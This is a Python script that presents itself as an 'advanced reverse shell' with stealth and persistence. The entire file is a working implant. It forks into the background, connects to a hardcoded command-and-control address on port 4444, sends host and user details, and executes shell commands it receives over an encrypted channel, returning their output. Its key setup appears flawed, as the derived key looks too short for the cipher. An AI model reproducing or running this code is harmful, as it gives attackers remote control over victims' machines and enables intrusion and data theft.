#!/usr/bin/env python3
"""
Advanced Reverse Shell with Enhanced Stealth and Persistence
Author: Security Researcher
Version: 2.1
"""

import socket
import subprocess
import os
import platform
import time
import sys
import ssl
import base64
import hashlib
from cryptography.fernet import Fernet

class AdvancedReverseShell:
    def __init__(self):
        self.C2_IP = "192.168.1.167"
        self.C2_PORT = 4444
        self.current_dir = os.getcwd()
        self.session_id = hashlib.md5(platform.node().encode()).hexdigest()[:8]
        self.initialize_encryption()
        
    def initialize_encryption(self):
        """Initialize AES encryption for secure communication"""
        key_base = hashlib.md5(b'superecon_secure_channel').digest()
        self.key = base64.urlsafe_b64encode(key_base)
        self.cipher = Fernet(self.key)
    
    def encrypt(self, data):
        """Encrypt data for secure transmission"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt(self, encrypted_data):
        """Decrypt received data"""
        try:
            return self.cipher.decrypt(encrypted_data).decode()
        except:
            return "DECRYPT_ERROR"
    
    def become_persistent(self):
        """Ensure process survives terminal closure"""
        try:
            if os.fork() > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
    
    def wait_for_network(self):
        """Wait for network connectivity before connecting"""
        for i in range(30):
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=5)
                return True
            except:
                time.sleep(2)
        return True
    
    def get_system_info(self):
        """Gather comprehensive system information"""
        info = {
            "session_id": self.session_id,
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "user": os.getenv('USER', 'unknown'),
            "uid": os.getuid() if hasattr(os, 'getuid') else 'unknown',
            "cwd": self.current_dir,
            "python_version": platform.python_version()
        }
        return str(info)
    
    def execute_command(self, cmd):
        """Execute command with enhanced error handling"""
        try:
            if cmd.startswith('cd '):
                return self.change_directory(cmd[3:])
            elif cmd == 'getuid':
                return f"User: {os.getenv('USER')} (UID: {os.getuid()})"
            elif cmd == 'sysinfo':
                return self.get_system_info()
            elif cmd == 'background':
                self.become_persistent()
                return "Process backgrounded"
            
            # Execute system command
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, 
                                  timeout=60, cwd=self.current_dir)
            output = result.stdout + result.stderr
            return output if output else "Command executed successfully"
            
        except subprocess.TimeoutExpired:
            return "Error: Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def change_directory(self, path):
        """Handle directory changes"""
        try:
            if path == "..":
                self.current_dir = os.path.dirname(self.current_dir)
            elif path.startswith("/"):
                self.current_dir = path
            else:
                self.current_dir = os.path.join(self.current_dir, path)
            
            if not os.path.exists(self.current_dir):
                self.current_dir = os.path.dirname(self.current_dir)
                return f"Directory does not exist: {path}"
            return f"Changed to: {self.current_dir}"
        except Exception as e:
            return f"cd error: {str(e)}"
    
    def connect(self):
        """Main connection loop with enhanced reliability"""
        self.become_persistent()
        self.wait_for_network()
        
        while True:
            try:
                print(f"[{self.session_id}] Connecting to {self.C2_IP}:{self.C2_PORT}")
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((self.C2_IP, self.C2_PORT))
                
                # Send system information
                system_info = self.get_system_info()
                s.send(self.encrypt(f"READY|{system_info}"))
                
                print(f"[{self.session_id}] Connected to C2")
                
                while True:
                    try:
                        # Receive command
                        encrypted_data = s.recv(8192)
                        if not encrypted_data:
                            continue
                            
                        command = self.decrypt(encrypted_data)
                        if command == "DECRYPT_ERROR":
                            continue
                        if command.lower() == 'exit':
                            break
                        
                        # Execute command
                        output = self.execute_command(command)
                        
                        # Send output
                        s.send(self.encrypt(output))
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        break
                        
            except ConnectionRefusedError:
                print(f"[{self.session_id}] Connection refused, retrying in 30s")
            except Exception as e:
                print(f"[{self.session_id}] Error: {e}")
            
            time.sleep(30)

if __name__ == "__main__":
    AdvancedReverseShell().connect()
